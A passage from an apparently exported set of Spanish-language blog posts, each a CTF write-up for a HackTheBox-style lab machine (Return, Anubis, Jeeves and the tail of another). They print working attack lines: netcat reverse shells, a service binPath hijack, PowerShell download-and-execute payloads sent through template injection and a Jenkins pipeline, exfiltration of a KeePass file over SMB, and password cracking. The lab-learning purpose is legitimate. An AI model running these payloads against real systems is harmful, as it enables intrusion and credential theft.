antigua (la que tiene la máquina instalada).\n\n\n```\npython3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&1|nc 10.10.14.15 443 /tmp/f'\n```\nRecibimos la shell en nuestro equipo y terminamos con esta máquina.\n\n\n```\n❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560\n# whoami\nroot\n# cat /root/root.txt\n7360xxxxxxxxxxxxxxxxxxx\n\n```\n"
    },
    {
        "title": "CTF - Return WriteUp",
        "slug": "ctf-return",
        "date": "2022-02-11",
        "tags": [
            "CTF",
            "Windows",
            "ServerOperatorGroupAbusing",
            "ServiceConfigurationManipulation",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-return/return.webp",
            "/static/images/uploads/ctf-return/image-7.webp"
        ],
        "draft": false,
        "summary": "Se trata de una máquina CTF de Capture The Flag basada en Windows. La vulnerabilidad explotada es la falta de seguridad en un formulario de registro que permite obtener acceso al sistema y escalar privilegios para obtener la flag.",
        "content": "![](/static/images/uploads/ctf-return/return.webp)\n\nEstamos ante una máquina **Windows**. Esto es algo que deducimos una vez hacemos un Ping para comprobar la conexión que tenemos con ella.\n\n\n```\n❯ ping 10.10.11.108 -c 1\nPING 10.10.11.108 (10.10.11.108) 56(124) bytes of data.\n64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=43.2 ms\n```\nEn la traza ICMP observamos que el TTL es de 127. Las maquinas Windows, en general, tienen un TTL configurado de 128 mientras que las máquinas Linux suelen tener un TTL de 64. En este caso, hasta llegar a la máquina pasamos por un nodo intermediario y por eso el TLL se descuenta en 1 unidad.\n\nTras un primer escaneo de puertos con NMAP, aparecen muchos de ellos abiertos. Además, en Windows este tipo de escaneos se suele demorar un poco más. Una vez escaneados los puertos abiertos con TCP Syn Scan, trato de sacar el máximo de información posible utilizando scripts básicos de reconocimiento de NMAP, para ver que información nos facilita.\n\n\n```\nnmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694,59851 -sCV -v 10.10.11.108 -oN targeted\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: HTB Printer Admin Panel\n135/tcp   open  msrpc         Microsoft Windows RPC\n...\n```\nHay un portal web abierto en el puerto 80 y parece un panel de administración de impresoras. Navegando un poco por la plataforma, veo un formulario de registro.\n\nEn estos casos donde el formulario te permite introducir una IP, una buena prueba es ponerte en escucha para ver que información te envía el servidor.\n\n![](/static/images/uploads/ctf-return/image-7.webp)\n\nCambio la dirección IP a mi equipo y me pongo en escucha en el mismo puerto con netcat.\n\n\n```\n❯ nc -lvp 389\nlistening on [any] 389 ...\n10.10.11.108: inverse host lookup failed: Unknown host\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.11.108] 59872\n0*`%return\\svc-printer�\n                       1edFg43012!!\n```\nParece una contraseña. Me la guardo junto con el usuario *return\\svc-printer*.\n\nAdemás, recuerdo que el puerto RPC estaba abierto. Podría probar a conectarme con [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).\n\n\n```\n❯ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'\nEvil-WinRM shell v3.3\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents whoami\nreturn\\svc-printer\n```\nY listo. Obtenemos la primera flag.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\documents cat ../desktop/user.txt\n6df0ae750542xxxxxxxxxxxxxxxxxxx \n```\nEl siguiente paso es buscar un método que nos permita escalar privilegios de Administrator. En este punto, un buen comienzo es enumerar los privilegios que dispone el usuario actual.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                         State\n============================= =================================== =======\nSeMachineAccountPrivilege     Add workstations to domain          Enabled\nSeLoadDriverPrivilege         Load and unload device drivers      Enabled\nSeSystemtimePrivilege         Change the system time              Enabled\nSeBackupPrivilege             Back up files and directories       Enabled\nSeRestorePrivilege            Restore files and directories       Enabled\nSeShutdownPrivilege           Shut down the system                Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled\nSeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set      Enabled\nSeTimeZonePrivilege           Change the time zone                Enabled\n```\n[SeLoadDriverPrivilege](https://www.tarlogic.com/es/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/) tiene vulnerabilidades conocidas que se podrían explotar, pero voy a continuar buscando información sobre los grupos a los que pertenezco.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop net user svc-printer\n...\nLocal Group Memberships      *Print Operators      *Remote Management Use\n                             *Server Operators\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n```\nConfirmamos que estamos en el grupo de *Remote Management Use* (por eso podemos conectarnos con WinRM) y además pertenezco a otros grupos. Me parece interesante *Server Operators* porque tal y como se visualiza en la web de [Microsoft](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators), vemos que tiene capacidad de parar y ejecutar servicios.\n\nEsto es una vulnerabilidad que se puede explotar porque los servicios son capaces de ejecutar binarios en su arranque. De esta forma, sería interesante configurar un servicio que ejecutase *nc.exe* con el fin de entablar una reverse shell a mi máquina atacante.\n\nLo primero es traer a la máquina Windows el binario *nc.exe*.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop upload /home/iocio/Desktop/iocio/HTB/Return/content/nc.exe\n```\nY trato de crear el nuevo servicio de Windows.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop sc.exe create reverse binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] OpenSCManager FAILED 5:\nAccess is denied.\n```\nParece que por alguna razón no podemos crear servicios. Vamos a intentar cambiar uno existente. Para ello, enumeramos aquellos que ya hay en ejecución.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\documents services\nPath                                                                                                                 Privileges Service          \n----                                                                                                                 ---------- -------          \nC:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             \n\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys       True MpKslceeb2796    \nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe                                                              True NetTcpPortSharing\nC:\\Windows\\SysWow64\\perfhost.exe                                                                                           True PerfHost         \n\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\"                                                False Sense            \nC:\\Windows\\servicing\\TrustedInstaller.exe                                                                                 False TrustedInstaller \n\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\"                                                     True VGAuthService    \n\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\"                                                                        True VMTools          \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\"                                             True WdNisSvc         \n\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\"                                            True WinDefend        \n\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\"                                                                      False WMPNetworkSvc\n```\nTras probar a cambiar varios y ver que no me permite modificarlos, doy con uno que sí.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop sc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd 10.10.14.21 443\"\n[SC] ChangeServiceConfig SUCCESS\n```\nA continuación, pongo en mi máquina netcat en escucha, paro el servicio y lo vuelvo a arrancar.\n\n\n```\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop sc.exe stop VMTools\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop sc.exe start VMTools\n```\nRecibimos la consola por el otro lado.\n\n\n```\nC:\\Windows\\system32whoami  \nnt authority\\system\nC:\\Windows\\system32type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\nf8fexxxxxxxxxxxxxxxxxxxxxxx\n```\nObtenemos la flag y terminamos la máquina.\n\n"
    },
    {
        "title": "CTF - Anubis WriteUp",
        "slug": "ctf-anubis-writeup",
        "date": "2022-02-12",
        "tags": [
            "CTF",
            "Windows",
            "SSTI",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-anubis-writeup/anubis.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-8.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-9.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-10.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-13.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-14.webp",
            "/static/images/uploads/ctf-anubis-writeup/image-16.webp"
        ],
        "draft": true,
        "summary": "En este texto se describe una máquina CTF llamada Anubis que ofrece un desafío de Capture The Flag. Se explora y se atacan vulnerabilidades en una máquina con Windows y se utilizan técnicas como la enumeración de puertos, el análisis de servicios como SAMBA y IIS, la inyección de código en plantillas de servidor y la obtención de una reverse shell. La máquina también parece estar ejecutándose en un contenedor.",
        "content": "![](/static/images/uploads/ctf-anubis-writeup/anubis.webp)\n\nEsta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.\n\nIniciamos el proceso validando la comunicación con mediante un Ping donde observamos además su TTL~127 por lo que se deduce que esta Windows ejecutandose en su interior.\n\nEscaneamos los puertos con nmap.\n\n\n```\nnmap -p- --open -sS -T5 -v -n -Pn 10.10.11.102 -oG allPorts\n```\nTratamos de enumerar las versiones de los puertos que tiene abiertos así como ejecutar varios scripts de reconocimiento básicos de NMAP con el fin de encontrar algún tipo de vulnerabilidad inicial. \n\n\n```\nnmap -p135,443,445,593,49711 -sCV 10.10.11.102 -oN targeted\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| ssl-cert: Subject: commonName=www.windcorp.htb\n| Subject Alternative Name: DNS:www.windcorp.htb\n| Not valid before: 2021-05-24T19:44:56\n|_Not valid after:  2031-05-24T19:54:56\n|_http-title: Not Found\n|_ssl-date: 2022-02-12T09:44:48+00:00; +1h00m01s from scanner time.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| tls-alpn: \n|_  http/1.1\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49711/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-02-12T09:44:09\n|_  start_date: N/A\n|_clock-skew: mean: 1h00m00s, deviation: 0s, median: 59m59s\n```\n### SAMBA\n\nVemos un par de puertos interesantes por donde vamos a empezar a revisar cosas que son el 443 y el 445.  Vamos a empezar con este último, de *smb*, para ver que información de la máquina sacamos rápidamente con Crackmapexec.\n\n\n```\n crackmapexec smb 10.10.11.102\nSMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)\n```\nDel comando superior recogemos que estamos ante una máquina con *Win10*, con nombre *EARTH*, perteneciente al dominio *windcorp.htb* y con smb firmado, por lo que no podremos aprovecharnos de vulnerabilidades existentes en aquellos entornos que no requieren firma.\n\nCon el siguiente comando, tratamos de enumerar posibles directorios de red compartidos que sean públicos.\n\n\n```\n❯ smbmap -H 10.10.11.102\n[+] IP: 10.10.11.102:445\tName: www.windcorp.htb\n❯ smbmap -H 10.10.11.102 -u \"null\"\n[!] Authentication error on 10.10.11.102\n```\nPor último, compruebo utilizando una herramienta alternativa, denominada *smbclient* para intentar por última vez listar recursos compartidos aprovechandonos de un [null session](https://en.wikipedia.org/wiki/Null_session).\n\n\n```\n❯ smbclient -L 10.10.11.102 -N\nAnonymous login successful\n\tSharename       Type      Comment\n\t---------       ----      -------\nSMB1 disabled -- no workgroup available\n```\nPoco más podemos hacer por aquí.\n\n## IIS\n\nContinuamos con el servidor web con certificado *https.* Conviene apuntarnos en */etc/hosts* el dominio *www.windcorp.htb* y *windcorp.htb* por si estuviésemos ante una máquina con virtual hosting.\n\nPodemos hacer una prueba rápida para verificar esto utilizando CURL con el parámetro *-k* para no tener problemas ante posibles certificados autofirmados.\n\n\n```\n❯ curl -I -X GET https://10.10.11.102 -k\nHTTP/2 404 \n...\n\n❯ curl -I -X GET https://www.windcorp.htb -k\nHTTP/2 200 \n...\n\n```\nSi tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.\n\n![](/static/images/uploads/ctf-anubis-writeup/image-8.webp)\n\nExaminamos con *openssl* el certificado de manera más detallada por si arrojase más información relevante.\n\n\n```\n❯ openssl s_client --connect windcorp.htb:443\nCONNECTED(00000003)\ndepth=0 CN = www.windcorp.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = www.windcorp.htb\nverify return:1\n---\nCertificate chain\n 0 s:CN = www.windcorp.htb\n   i:CN = www.windcorp.htb\n\n```\nVolvemos a ver el subdominio *www*. Lanzamos un *whatweb* para ver si llegamos a ver información de interés.\n\n\n```\n❯ whatweb https://www.windcorp.htb\nhttps://www.windcorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@windcorp.htb], Frame, HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Lightbox, Microsoft-IIS[10.0], Script, Title[Windcorp - Index] \n```\nVemos que está un [Internet Information Services](https://es.wikipedia.org/wiki/Internet_Information_Services) de Microsoft como servidor por lo que podemos deducir que los tipos de lenguaje que interpreta el servidor estarán relacionados con ASP.NET. Vamos a volver a examinar la página.\n\nNos encontramos ante un formulario.\n\n![](/static/images/uploads/ctf-anubis-writeup/image-9.webp)\n\nSi introducimos información en él y le damos a *Send Message*, nos encontramos la siguiente página.\n\n![](/static/images/uploads/ctf-anubis-writeup/image-10.webp)\n\nLa información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).\n\nVamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.\n\n![](/static/images/uploads/ctf-anubis-writeup/image-13.webp)\n\n¿5x5? 😎 Exacto, 25.\n\n![](/static/images/uploads/ctf-anubis-writeup/image-14.webp)\n\nLo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.\n\nEncontramos un modo de ejecutar código desde una shell [aquí](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html).\n\n\n```\n%response.write CreateObject(\"WScript.Shell\").Exec(\"ping 10.10.14.21\").StdOut.Readall()%\n\n```\nPero necesitamos una manera de entablar una reverse shell desde Windows, que no es tan trivial como en Linux con Bash. En el repositorio de Nishang, cogemos [esta](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell. La idea es cambiar el script de arriba de tal modo que primero nos descarguemos el script a la máquina remota.\n\n\n```\n%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell IEC(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\").StdOut.Readall()%\n```\nSiempre que lidiamos con comillas dobles, comillas simples, etc, es mejor encodear el contenido en base64 y tratar de transmitir la información de esa forma. Además, Powershell permite ejecutar código en base64 pasándole el parámetro -e, por lo que vamos a tratar de cambiar primero el comando de arriba un poco. Cosas a tener en consideración según [Microsoft](https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2).\n\n\n En general, Windows PowerShell tiene configurada la codificación UNICODE [UTF-16LE](https://wikipedia.org/wiki/UTF-16) de forma predeterminada.\n\nPara ello, ejecutamos el siguiente código.\n\n\n```\n❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\"data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\n```\nBásicamente, lo que hacemos cambiando el encoding a utf-16le, es añadir esos puntos entre los caracteres si los visualizamos en formato hexadecimal. Pero a nosotros nos interesa el contenido en base64, por lo que nos quedamos con el último output del mensaje.\n\nPara ello, ponemos un servidor en escucha en nuestra máquina y *netcat* en el 443 (con *rlwrap* para poder usar los cursores en la nueva consola), puesto que se van a realizar las dos cosas al mismo tiempo.\n\nPonemos el script inferior en el formulario y ejecutamos.\n\n\n```\n%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==\").StdOut.Readall()%\n```\n![](/static/images/uploads/ctf-anubis-writeup/image-16.webp)\n\nYa hemos ganado acceso a la máquina.\n\nCon un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.\n\n\n```\n❯ ipconfig\nWindows IP Configuration\nEthernet adapter vEthernet (Ethernet):\n\n   Connection-specific DNS Suffix  . : htb\n   Link-local IPv6 Address . . . . . : fe80::9d2d:a5ec:4bd2:b52d%32\n   IPv4 Address. . . . . . . . . . . : 172.22.47.185\n   Subnet Mask . . . . . . . . . . . : 255.255.240.0\n   Default Gateway . . . . . . . . . : 172.22.32.1\n   \n❯ ls C:\\\n    Directory: C:\\\nMode                LastWriteTime         Length Name                         \n----                -------------         ------ ----                         \nd-----        4/25/2021  11:23 PM                inetpub                     \nd-r---        5/24/2021  10:49 PM                Program Files\nd-----         4/9/2021  10:34 PM                Program Files (x86)\nd-r---         4/9/2021  10:37 PM                Users\nd-----        4/26/2021  12:32 AM                Windows\n```\nPodríamos asegurarnos una TTY interactiva utlizando una utilidad de AntonioCoco que tenemos en su repositorio llamada [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) pero como la máquina es larga, vamos a saltarnos este paso.\n\n"
    },
    {
        "title": "CTF - Jeeves WriteUp",
        "slug": "ctf-jeeves",
        "date": "2022-02-12",
        "tags": [
            "CTF",
            "Windows",
            "PassTheHash",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-jeeves/Jeeves.webp",
            "/static/images/uploads/ctf-jeeves/image-17.webp",
            "/static/images/uploads/ctf-jeeves/image-18.webp",
            "/static/images/uploads/ctf-jeeves/image-19.webp",
            "/static/images/uploads/ctf-jeeves/image-20.webp",
            "/static/images/uploads/ctf-jeeves/image-21.webp",
            "/static/images/uploads/ctf-jeeves/image-22.webp"
        ],
        "draft": false,
        "summary": "Reto CTF que consiste en buscar vulnerabilidades en una máquina Windows. Se exploran puertos, se encuentra una vulnerabilidad en Jenkins y se logra obtener acceso de administrador. La flag se encuentra en un stream de datos oculto.",
        "content": "![](/static/images/uploads/ctf-jeeves/Jeeves.webp)\n\nEscaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos. Omitiré la información no relevante.\n\n\n```\nnmap -p80,135,445,50000 -vvv -sCV -n -Pn 10.10.10.63 -oG targeted\nPORT      STATE SERVICE      REASON          VERSION\n80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-title: Ask Jeeves\n|_http-server-header: Microsoft-IIS/10.0\n445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\nService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-02-12T22:04:41\n|_  start_date: 2022-02-12T21:50:58\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n```\nLo primero que observamos es que la firma de smb no es necesaria. A continuación, lo validamos con *crackmapexec*.\n\n\n```\n❯ crackmapexec smb 10.10.10.63\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\n```\nEstamos ante una máquina Win10 x64 y SMB no está firmado. Esto lo hace potencialmente vulnerable a un ataque de tipo PassTheHash. Continuamos investigando. Entrando en la web y aparece la siguiente imagen.\n\n![](/static/images/uploads/ctf-jeeves/image-17.webp)\n\nCuando buscas algo, siempre sale la misma ventana de error que no es un error como tal, es un archivo png. No parece que se esté ejecutando nada.\n\nAplico Fuzzing contra el puerto 80 y el puerto 50000. En este segundo puerto, parece que encuentro una ruta disponible en */askjeeves*.\n\n\n```\n❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://10.10.10.63:50000/FUZZ\"\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://10.10.10.63:50000/FUZZ\nTotal requests: 220560\n=====================================================================\nID           Response   Lines    Word       Chars       Payload \n=====================================================================\n000041607:   302        0 L      0 W        0 Ch        \"askjeeves\"\n```\nAccedo a la URL y encuentro un Jenkins de v2.87.\n\n![](/static/images/uploads/ctf-jeeves/image-18.webp)\n\nEncontramos una [vulnerabilidad](https://cxsecurity.com/issue/WLB-2019020120) con el pipeline de Jenkins para esa versión. Hacemos una prueba rápida colocando un comando en la ventana de configuración del pipeline.\n\n![](/static/images/uploads/ctf-jeeves/image-19.webp)\n\n*Es importante seleccionar el Sandbox de Groovy que es quien tiene la vulnerabilidad*.\n\nPonemos en escucha *tcpdump* y vemos si hay respuesta cuando ejecutamos el pipeline.\n\n![](/static/images/uploads/ctf-jeeves/image-20.webp)\n\nSe acontece la vulnerabilidad. Modificamos el script de arriba para que nos entable una reverse shell.\n\nPara ello, vamos a enviar a la consola de Powershell un código codificado en base64. El código en cuestión es el siguiente.\n\n\n```\nIEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\n```\nEsto descargará un script desde nuestro equipo y lo ejecutará en el entorno remoto. Dicho script contiene una reverse shell descargada del repositorio de [Nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) que modificaremos a nuestro gusto.\n\nLa forma de codificarlo a base64 pasa por cambiar el encoding a UTF-16LE si queremos tener en consideración a [Microsoft](https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2). De lo contrario, probablemente no podrá ejecutar nuestro comando.\n\n\n En general, Windows PowerShell tiene configurada la codificación UNICODE [UTF-16LE](https://wikipedia.org/wiki/UTF-16) de forma predeterminada.\n\nPara ello, ejecutamos el siguiente código.\n\n\n```\n❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\"data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==powershell\n```\nCopiamos el código final en base64 y lo adjuntamos a nuestro exploit del pipeline de Jenkins.\n\n\n```\nnode {\n   powershell 'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA=='\n}\n```\nPonemos un servidor en nuestro equipo que acepte la descarga del script y en otra ventana netcat en escucha en el puerto 443.\n\nEjecutamos el pipeline en Jenkins.\n\n![](/static/images/uploads/ctf-jeeves/image-21.webp)\n\nRecibimos la consola de nuestro lado.\n\n\n```\n❯ rlwrap nc -nlvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.10.63] 49685\nWindows PowerShell running as user kohsuke on JEEVES\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test whoami\njeeves\\kohsuke\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test cat C:\\Users\\kohsuke\\Desktop\\user.txt    \ne323xxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\nObtenemos la primera flag y continuamos con el escalado de privilegios.\n\nEn la carpeta documentos del usuario, descubrimos un archivo kdbx. Esta extensión pertenece a [KeePass](https://www.file-extension.info/es/format/kdbx).\n\n\n```\nPS C:\\Users\\kohsuke\\Documentsls\nCEH.kdbx\n```\nPara descargarnos el archivo a nuestro equipo, montamos un servidor samba.\n\n\n```\n❯ impacket-smbserver smbFolder $(pwd) -smb2support\n```\nY nos copiamos el archivo directamente en nuestro equipo.\n\n\n```\nPS C:\\Users\\kohsuke\\Documentscopy CEH.kdbx \\\\10.10.14.21\\smbFolder\\CEH.kdbx\n```\nPrimero obtenemos el hash de la contraseña con *keepass2john*, ejecutamos *[John The Ripper](https://www.openwall.com/john/)* con el diccionario [Rockyou](https://www.quora.com/How-many-passwords-are-in-rockyou-txt#:~:text=The%20rockyou.txt%20that%20comes,2020.2a%20contains%2014%2C442%2C063%20words.) que contiene más de 14 millones de las contraseñas más utilizadas y mostramos los resultados.\n\n\n```\n❯ keepass2john CEH.kdbx  hash\n❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n❯ john -show hash\nCEH:mooxxxxx\n```\nParece que los resultados han sido positivos. Usamos la contraseña para abrir el archivo *kdbx* en un cliente de KeePass como [KeePassXC](https://keepassxc.org/).\n\n![](/static/images/uploads/ctf-jeeves/image-22.webp)\n\nLa entrada 